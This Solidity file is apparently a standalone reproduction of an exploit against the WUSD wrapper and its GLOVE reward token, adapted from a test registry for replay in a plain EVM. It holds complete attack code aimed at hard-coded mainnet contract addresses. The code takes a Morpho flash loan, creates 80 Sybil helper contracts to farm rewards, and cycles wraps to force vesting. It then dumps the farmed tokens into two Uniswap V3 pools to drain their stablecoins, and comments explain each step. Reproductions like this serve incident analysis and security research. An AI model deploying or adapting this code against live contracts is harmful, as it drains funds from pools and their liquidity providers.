// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground - mirrors the registry's
// WUSD_exp.sol testExploit()/onMorphoFlashLoan() logic verbatim, but without
// inheriting forge-std Test (the outer contract there is `WUSDExploitTest is
// Test`; any Test-derived contract reverts in a plain EVM replay because
// modifiers/helpers that probe the Foundry cheatcode address see EXTCODESIZE
// == 0). The real test's only cheatcode dependency inside testExploit() is
// `deal(USDT, address(this), 250_000e6)` (seed fee-capital); that is replaced
// here by a `dealToken` setup step in the config, run unrecorded before
// attackFunction. console.log / assertEq / assertGt calls (Test-only) are
// dropped; the underlying attack logic (flash loan, 80 Sybil helpers, epoch
// pump, vest, dump) is unchanged.

interface IERC20Min {
    function balanceOf(
        address
    ) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWUSD {
    function balanceOf(
        address
    ) external view returns (uint256);
    function wrap(address fiatcoin, uint256 amount, address referrer) external;
    function unwrap(address fiatcoin, uint256 amount) external;
}

interface IGlove {
    function balanceOf(
        address
    ) external view returns (uint256);
    function creditlessOf(
        address account
    ) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IMorphoBuleFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

// A fresh, zero-GLOVE Sybil identity. Mirrors the CREATE2-deployed helper
// contracts the real attacker used (e.g. 0x7ec5a4dc..., 0xa5f28cc3...).
contract Wrapper {
    IWUSD constant WUSD = IWUSD(0x068E3563b1c19590F822c0e13445c4FA1b9EEFa5);
    IGlove constant GLOVE = IGlove(0x70c5f366dB60A2a0C59C4C24754803Ee47Ed7284);
    IERC20Min constant USDT = IERC20Min(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    constructor() {
        // USDT (Tether) approve/transfer return no bool -> use low-level calls.
        _usdtCall(abi.encodeWithSelector(IERC20Min.approve.selector, address(WUSD), type(uint256).max));
    }

    function _usdtCall(
        bytes memory data
    ) internal {
        (bool ok,) = address(USDT).call(data);
        require(ok, "USDT call failed");
    }

    // Wrap `usdtAmount` (native 6-dec) of USDT into WUSD, harvesting the GLOVE reward.
    function wrap(
        uint256 usdtAmount
    ) external {
        WUSD.wrap(address(USDT), usdtAmount, address(0));
    }

    // Full unwrap: triggers _deglove(), which vests creditless->credited GLOVE and returns USDT.
    function unwrapAll() external {
        WUSD.unwrap(address(USDT), WUSD.balanceOf(address(this)));
    }

    // GLOVE credited to this fresh address can only be moved by THIS address (the credit
    // ledger does not travel with a plain transfer), so each helper dumps its own GLOVE.
    // Sell the full GLOVE balance (token0) into `pool` for its stablecoin (token1 -> recipient).
    function dumpGlove(
        address pool,
        address recipient
    ) external {
        uint256 amt = GLOVE.balanceOf(address(this));
        if (amt > 0) {
            IV3Pool(pool).swap(recipient, true, int256(amt), 4_295_128_739 + 1, "");
        }
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256,
        bytes calldata
    ) external {
        if (amount0Delta > 0) GLOVE.transfer(msg.sender, uint256(amount0Delta)); // pay GLOVE (token0)
    }

    function sweepUSDT(
        address to
    ) external {
        uint256 b = USDT.balanceOf(address(this));
        if (b > 0) _usdtCall(abi.encodeWithSelector(IERC20Min.transfer.selector, to, b));
    }
}

contract WUSDExploit {
    IWUSD constant WUSD = IWUSD(0x068E3563b1c19590F822c0e13445c4FA1b9EEFa5);
    IGlove constant GLOVE = IGlove(0x70c5f366dB60A2a0C59C4C24754803Ee47Ed7284);
    IERC20Min constant USDT = IERC20Min(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Min constant USDC = IERC20Min(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IV3Pool constant POOL_USDC = IV3Pool(0xB89F65D6c7d33A35Da7C01934e310a6f40E18A1f);
    IV3Pool constant POOL_USDT = IV3Pool(0xa2Bd1A142ff49131B8CC70A332bdA0125018c324);

    IMorphoBuleFlashLoan constant MORPHO = IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    uint256 constant WRAP_USDT = 100_000e6; // 100,000 USDT -> 100,000 WUSD, max-caps the GLOVE reward
    uint256 constant FUND_USDT = 101_000e6; // wrap pulls amount + 1% fee

    uint256 constant N_FARM = 80; // fresh Sybil identities (the real campaign used 80 per tx)
    uint256 constant N_PUMP = 101; // extra wrap/unwrap cycles to drive >=100 global epochs (vesting)

    uint256 public gloveFarmed;
    uint256 public usdcDrained;
    uint256 public usdtDrained;

    // ---------------------------------------------------------------------
    // Full exploit: Morpho flash loan -> Sybil-farm + vest GLOVE -> dump into
    // the GLO/USDC and GLO/USDT V3 pools -> repay -> measure result. The
    // 250,000 USDT fee-capital this contract needs is seeded by the config's
    // `dealToken` setup step before this function runs.
    // ---------------------------------------------------------------------
    function run() external {
        uint256 poolUSDCBefore = USDC.balanceOf(address(POOL_USDC));
        uint256 poolUSDTBefore = USDT.balanceOf(address(POOL_USDT));

        // Peak working capital = N_FARM positions held open simultaneously + a pump buffer.
        uint256 loan = N_FARM * FUND_USDT + 250_000e6;
        MORPHO.flashLoan(address(USDT), loan, "");

        usdcDrained = poolUSDCBefore - USDC.balanceOf(address(POOL_USDC));
        usdtDrained = poolUSDTBefore - USDT.balanceOf(address(POOL_USDT));
    }

    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == address(MORPHO), "only Morpho");

        // --- Step 1: Sybil-farm. Each fresh helper wraps 100k WUSD -> 2 free GLOVE (no Sybil
        //     resistance whatsoever), and each wrap advances one global epoch. Positions stay
        //     OPEN (USDT locked in WUSD) so epochs can elapse before we unwrap & vest.
        Wrapper[] memory farms = new Wrapper[](N_FARM);
        for (uint256 i = 0; i < N_FARM; i++) {
            farms[i] = new Wrapper();
            _usdtTransfer(address(farms[i]), FUND_USDT);
            farms[i].wrap(WRAP_USDT);
            require(GLOVE.balanceOf(address(farms[i])) == 2e18, "fresh address should mint 2 GLOVE");
        }

        // --- Step 2: pump extra epochs so every farmed position reaches >=100 epochs of
        //     vesting. One pump helper recycles its principal, paying only the 1% fee.
        Wrapper pump = new Wrapper();
        _usdtTransfer(address(pump), 250_000e6);
        for (uint256 i = 0; i < N_PUMP; i++) {
            pump.wrap(WRAP_USDT);
            pump.unwrapAll();
        }
        pump.sweepUSDT(address(this));

        // --- Step 3: unwrap each farm in full -> _deglove() vests its creditless GLOVE into
        //     transferable credited GLOVE and returns the USDT principal; then the helper
        //     dumps its own GLOVE into a V3 pool (proceeds -> this contract), and returns
        //     leftover USDT.
        for (uint256 i = 0; i < N_FARM; i++) {
            farms[i].unwrapAll();
            gloveFarmed += GLOVE.balanceOf(address(farms[i]));
            // split the dump across both thin pools
            farms[i].dumpGlove(i % 2 == 0 ? address(POOL_USDC) : address(POOL_USDT), address(this));
            farms[i].sweepUSDT(address(this));
        }

        // --- Step 4: repay the Morpho flash loan (pulled back via transferFrom).
        _usdtCall(abi.encodeWithSelector(IERC20Min.approve.selector, address(MORPHO), assets));
    }

    function _usdtTransfer(
        address to,
        uint256 amount
    ) internal {
        _usdtCall(abi.encodeWithSelector(IERC20Min.transfer.selector, to, amount));
    }

    function _usdtCall(
        bytes memory data
    ) internal {
        (bool ok,) = address(USDT).call(data);
        require(ok, "USDT call failed");
    }
}
